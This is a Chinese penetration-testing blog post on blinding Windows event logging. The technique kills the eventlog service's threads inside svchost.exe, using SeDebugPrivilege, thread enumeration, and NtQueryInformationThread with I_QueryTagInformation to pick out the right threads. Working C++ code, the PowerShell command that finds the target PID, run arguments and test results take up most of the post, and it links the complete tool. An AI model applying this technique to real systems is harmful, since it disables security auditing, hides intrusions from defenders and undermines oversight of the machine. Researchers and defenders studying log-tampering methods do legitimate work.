---
layout: post
title: 利用API NtQueryInformationThread和I_QueryTagInformation实现对Windwos日志监控的绕过
---

---

## 0x00 前言
---

在上篇文章[《渗透技巧——Windows日志的删除与绕过》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87/)中提到一个绕过Windows日志监控的思路：使用API NtQueryInformationThread和I_QueryTagInformation获取线程对应的服务，关闭对应日志记录功能的线程，能够破坏日志功能，并且Windows Event Log服务没有被破坏，状态仍为正在运行。本文将要对其详细介绍，分享使用c++在编写程序上需要注意的细节。

## 0x01 简介
---

本文将要介绍以下内容：

- 程序自身提权
- 遍历进程中的所有线程
- 根据线程tid，获取对应的进程pid
- 根据线程tid，获取对应的服务名称
- 结束线程

## 0x02 程序实现
---

开发工具： VS2012
开发语言： c++

### 1、定位eventlog服务对应进程svchost.exe的pid

powershell代码如下：

`Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId`

通过回显能够找出进程svchost.exe的pid

### 2、程序自身提权，以管理员权限执行

因为进程svchost.exe为系统权限，所以对其线程进行操作也需要高权限，因此，程序需要先提升至管理员权限

提权至管理员权限的代码如下：

```
BOOL SetPrivilege()  
{  
    HANDLE hToken;   
    TOKEN_PRIVILEGES NewState;   
    LUID luidPrivilegeLUID;   
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)||!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidPrivilegeLUID))   
    {   
        printf("SetPrivilege Error\n");  
        return FALSE;   
    }   
    NewState.PrivilegeCount = 1;   
    NewState.Privileges[0].Luid = luidPrivilegeLUID;   
    NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;   
    if(!AdjustTokenPrivileges(hToken, FALSE, &NewState, NULL, NULL, NULL))  
    {  
        printf("AdjustTokenPrivilege Errro\n");  
        return FALSE;  
    }  
    return TRUE;  
}  
```

### 3、遍历进程中的所有线程

定位进程svchost.exe后，需要遍历该进程中的所有线程，然后进行筛选

根据进程pid遍历其子进程的代码如下：

```
BOOL ListProcessThreads(DWORD pid) 
{  
    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;  
    THREADENTRY32 te32;    
    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);  
    if (hThreadSnap == INVALID_HANDLE_VALUE)  
        return(FALSE);   
    te32.dwSize = sizeof(THREADENTRY32);  
    if (!Thread32First(hThreadSnap, &te32)) 
    { 
        printf("Thread32First");
        CloseHandle(hThreadSnap);   
        return(FALSE);  
    }  
    do 
    {  
        if (te32.th32OwnerProcessID == pid)
            printf("tid= %d\n",te32.th32ThreadID);             
    } while (Thread32Next(hThreadSnap, &te32));  
    CloseHandle(hThreadSnap);  
    return(TRUE);  
}  
```

获取进程中的所有线程tid，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-25/2-1.png)

### 4、判断线程是否满足条件

筛选出Windows Event Log服务对应的线程，方法如下：

根据线程tid，获取对应的服务名称

可参考以下链接：

https://wj32.org/wp/2010/03/30/howto-use-i_querytaginformation/

文中提到，需要使用三个API：

**NtQueryInformationThread：**

- 来自ntdll.dll
- dll路径：%WinDir%\System32\

使用IDA对其验证，查看ntdll.dll的导出函数，能够发现API函数NtQueryInformationThread，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-25/3-1.png)

具体使用方式：

```
typedef NTSTATUS (WINAPI* FN_NtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);
FN_NtQueryInformationThread pfnNtQueryInformationThread = NULL;
pfnNtQueryInformationThread = (FN_NtQueryInformationThread)GetProcAddress(GetModuleHandle(_T("ntdll")), "NtQueryInformationThread");
```

**I_QueryTagInformation：**

- 来自advapi32.dll
- dll路径：%WinDir%\System32\下

使用IDA对其验证，查看advapi32.dll的导出函数，能够发现API函数I_QueryTagInformation，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-25/3-2.png)

具体使用方式：
        
```
typedef ULONG (WINAPI* FN_I_QueryTagInformation)(PVOID, SC_SERVICE_TAG_QUERY_TYPE, PSC_SERVICE_TAG_QUERY);
FN_I_QueryTagInformation pfnI_QueryTagInformation = NULL;
HMODULE advapi32 = LoadLibrary(L"advapi32.dll");
pfnI_QueryTagInformation = (FN_I_QueryTagInformation)GetProcAddress(advapi32, "I_QueryTagInformation");
```

**NtReadVirtualMemory：**

可使用ReadProcessMemory代替

更为完整的代码实例可参考如下链接：

http://blog.naver.com/PostView.nhn?blogId=gloryo&logNo=110129121084&redirect=Dlog&widgetTypeCall=true

该文章分享了一段代码，提供进程pid和线程tid，能够获取对应的服务名称

当然，我们需要对该代码作改进，不需要提供进程pid，只需要线程tid就好

根据线程tid获取对应进程pid，代码如下：

```
BOOL QueryThreadBasicInformation(HANDLE hThread)
{
    typedef NTSTATUS (WINAPI* FN_NtQueryInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG, PULONG);
    FN_NtQueryInformationThread pfnNtQueryInformationThread = NULL;
    pfnNtQueryInformationThread = (FN_NtQueryInformationThread)GetProcAddress(GetModuleHandle(_T("ntdll")), "NtQueryInformationThread");
    THREAD_BASIC_INFORMATION threadBasicInfo;
    LONG status = pfnNtQueryInformationThread(hThread, ThreadBasicInformation, &threadBasicInfo,sizeof(threadBasicInfo), NULL);
    printf("process ID is %u\n",threadBasicInfo.clientId.uniqueProcess); 
    printf("Thread ID is %u\n",threadBasicInfo.clientId.uniqueThread); 

    return TRUE;
}
```

测试程序能够通过tid获取相关进程pid，运行如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-25/3-3.png)

至此，我们能够根据提供的线程tid判断出对应的进程pid和服务名称

接着，需要添加判断功能，筛选出eventlog服务，进行下一步操作：结束线程

### 5、结束线程

同结束进程类似，需要提供进程tid，代码如下：

```
void TerminateEventlogThread(DWORD tid)
{
    HANDLE hThread = OpenThread(0x0001,FALSE,tid);
    if(TerminateThread(hThread,0)==0)
        printf("--> Error !\n");
    else
        printf("--> Success !\n");
    CloseHandle(hThread);
}
```

综上，将所有功能集成到一个程序中，使用时只需要提供进程svchost.exe的pid就好

**完整源代码下载地址：**

https://github.com/3gstudent/Windwos-EventLog-Bypass/blob/master/WindowsEventLogBypass.cpp

## 0x03 实际测试
---

获取进程svchost.exe的pid：

`Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId`

获得pid为916

运行WindowsEventLogBypass.exe，添加pid

参数如下：

`WindowsEventLogBypass.exe 916`

实际测试，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-25/4-1.png)

成功结束线程，日志功能失效，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-25/4-2.png)

## 0x04 小结
---

本文介绍了使用c++编写程序绕过Windows日志的技巧，同Halil Dalabasmaz@hlldz分享的Powershell工程Invoke-Phant0m结合学习，希望能够帮助大家更好的了解这项技术。

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)



















